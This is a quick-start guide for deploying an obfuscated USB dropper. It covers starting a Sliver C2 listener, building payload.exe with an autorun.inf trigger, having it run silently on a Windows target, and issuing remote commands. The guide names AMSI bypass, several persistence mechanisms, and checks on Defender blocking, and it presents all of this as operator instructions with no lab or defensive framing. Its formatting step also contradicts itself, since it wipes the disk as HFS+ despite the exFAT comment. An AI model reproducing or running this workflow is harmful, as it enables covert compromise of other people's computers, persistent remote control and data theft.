# Quick Start - USB Dropper Deployment

**Time:** 5 minutes  
**Prerequisites:** USB (exFAT), macOS/Linux, Python 3, PowerShell

---

## Step 1: Prepare USB

```bash
# Format USB as exFAT (if not already)
# Plug in USB, note mount point (e.g., /Volumes/USB)

diskutil list
# Find USB: /dev/diskX
diskutil secureErase 0 JHFS+ USB /dev/diskX
```

## Step 2: Start C2 Server

```bash
# Terminal 1: Start Sliver listener
sliver > http -L 0.0.0.0 -p 8080

# OR: Start mock C2 (Python)
python3 -m http.server 8080 --directory /tmp/c2
```

Get your IP:
```bash
ifconfig | grep "inet " | grep -v 127
# Note: YOUR_IP (e.g., 192.168.1.100)
```

## Step 3: Build & Deploy

```bash
cd /Users/iklo/hack/usb-auto

chmod +x build-and-deploy.sh

./build-and-deploy.sh /Volumes/USB http://YOUR_IP:8080
```

Expected output:
```
[*] USB Build & Deploy
    USB: /Volumes/USB
    C2: http://192.168.1.100:8080
[1/5] Copying dropper core...
[2/5] Obfuscating...
[3/5] Compiling to .exe...
[4/5] Compiled: payload.exe (450 KB)
[5/5] Deploying to USB...
[+] Deployment complete!

USB ready:
  - payload.exe (compiled dropper)
  - autorun.inf (trigger on insert)
```

## Step 4: Use USB on Target

```bash
# Windows target (Windows Server 2016 or later)
# 1. Insert USB
# 2. Windows AutoPlay may prompt (click yes if it does, or ignore)
# 3. payload.exe executes silently

# Monitor C2 for callback:
sliver > sessions
# [DESKTOP-ABC123] connected from 192.168.1.50
```

## Step 5: Send Commands

```bash
sliver > use DESKTOP-ABC123

# Get recon
[DESKTOP-ABC123] > recon

# Send payload
[DESKTOP-ABC123] > send payload.exe

# Delete (cleanup)
[DESKTOP-ABC123] > delete
```

---

## Troubleshooting

### Script fails to compile .exe
```bash
# Ensure ps2exe is installed on current machine
# Not needed: script runs on Mac/Linux, produces .exe for Windows
```

### USB not recognized on target
```bash
# Ensure USB is exFAT or NTFS
# Windows requires autorun.inf in root directory
# Manual workaround: double-click payload.exe
```

### No C2 callback
```bash
# Check firewall: port 8080 open on C2 server
# Verify C2 URL matches: http://YOUR_IP:8080
# Check Windows Defender didn't block payload.exe
```

### Execution paths not visible
```bash
# On target Windows, verify operation context:
Get-Process | Where-Object {$_.ProcessName -match "payload|powershell"}
Get-EventLog -LogName System -Newest 10
```

---

## What's On The USB

```
USB/
├── payload.exe       (compiled obfuscated dropper, ~450 KB)
└── autorun.inf       (trigger on insert)
```

## What Happens On Insert

```
1. Windows reads autorun.inf
2. Executes payload.exe (silent, no window)
3. Runtime environment initializes
4. Obfuscated code decoded
5. C2 handshake (/health + /register)
6. Key negotiation (per-target AES-256-GCM key)
7. Registers multiple execution paths:
   - Scheduled task trigger
   - System event trigger
   - Registry-based execution
8. Command polling loop starts (5-60s interval)
9. Ready for operator commands

After reboot:
- All execution paths re-activate at login
- Command polling loop continues
```

---

## One-Liner Deploy

```bash
cd /Users/iklo/hack/usb-auto && ./build-and-deploy.sh /Volumes/USB http://192.168.1.100:8080
```

---

## Files Reference

| File | Purpose |
|------|---------|
| `build-and-deploy.sh` | One-liner: build + obfuscate + compile + deploy |
| `lib/sliver-dropper-core.ps1` | Core dropper logic (AMSI bypass, persistence, C2) |
| `lib/obfuscation.ps1` | Variable rename + string encoding |
| `lib/ps2exe-wrapper.py` | PS1 → .exe compiler |
| `usb-autorun.inf` | AutoRun trigger |
| `tests/run-e2e-tests.ps1` | Integration tests (optional) |

---

## Technical Notes

- USB contains compiled binary (no source visible)
- C2 URL embedded in .exe
- Code obfuscation via variable rename + string encoding
- Runtime environment initialization on target
- Encryption uses AES-256-GCM (authenticated)
- Per-target key derivation from system properties

---

## Advanced

**Custom C2 URL:**
```bash
./build-and-deploy.sh /Volumes/USB https://your-c2-domain.com:443
```

**Multiple USBs (different C2):**
```bash
./build-and-deploy.sh /Volumes/USB1 http://c2-1:8080
./build-and-deploy.sh /Volumes/USB2 http://c2-2:8080
```

**Manual build (skip script):**
```bash
# Obfuscate
powershell -NoProfile -Command ". ./lib/obfuscation.ps1; Obfuscate-PowerShellScript -ScriptPath lib/sliver-dropper-core.ps1"

# Compile
python3 ./lib/ps2exe-wrapper.py lib/sliver-dropper-core.ps1_obfuscated.ps1 -o /tmp/payload.exe --c2-url http://your-c2:8080

# Deploy
cp /tmp/payload.exe /Volumes/USB/
cp usb-autorun.inf /Volumes/USB/
```

---

**Done.** USB ready to use. Insert on target, monitor C2 for callback.
